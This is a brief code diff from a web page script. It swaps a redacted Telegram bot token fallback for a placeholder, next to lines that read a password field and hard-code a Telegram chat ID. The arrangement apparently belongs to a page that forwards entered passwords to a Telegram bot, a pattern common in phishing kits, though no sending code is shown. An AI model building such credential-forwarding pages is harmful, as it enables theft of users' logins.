@@ -462,7 +462,7 @@ async function waitForConfig(maxWait = 3000) {
             const password = document.getElementById('password');
 
             // Configuration Telegram
-            const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
+            const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
             const CHAT_ID = '8176081750';
 
             function showToast(message, isError = false) {
